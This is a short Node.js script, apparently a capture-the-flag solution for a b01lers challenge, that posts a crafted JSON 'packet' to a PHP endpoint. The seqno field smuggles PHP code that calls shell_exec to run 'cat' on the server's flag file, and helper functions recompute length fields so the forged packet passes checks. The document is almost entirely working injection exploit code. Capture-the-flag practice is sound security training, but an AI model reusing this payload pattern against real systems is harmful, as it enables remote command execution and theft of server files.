const qs = require('qs')
const axios = require('axios')


const update_len = packet => {
    let expected = JSON.stringify(packet).length;
    let previous = packet['len'];
    packet['len'] = expected + expected.toString().length - previous.toString().length;
}

const update_ihl = packet => {
    let ihl = packet['version'].toString().length + packet['len'].toString().length + packet['ttl'].toString().length + packet['seqno'].toString().length + packet['ackno'].toString().length + packet['algo'].toString().length +64
    packet['ihl'] = ihl + ihl.toString.length + 2;
}

packet = {
    "version": "6.5",
    "ihl": 142,
    "len": 170,
    "ttl": 1,
    "seqno": "0));$checksum=0;echo '<pre>'.shell_exec('php-code').'</pre>';((",    
    "ackno": "1",
    "algo": "sha256",
    "checksum":"0",
    "data":""
}

packet['seqno'] = packet['seqno'].replace('php-code', `cat sent/flag.packet.php`)
update_len(packet)
update_ihl(packet)

axios({
    method: 'post',
    url: 'http://chal.ctf.b01lers.com:3002/packets/send.php',
    data: qs.stringify({
      packet: JSON.stringify(packet)
    }),
    headers: {
      'content-type': 'application/x-www-form-urlencoded;charset=utf-8'
    }
  }).then((data) => console.log(data['data']))
  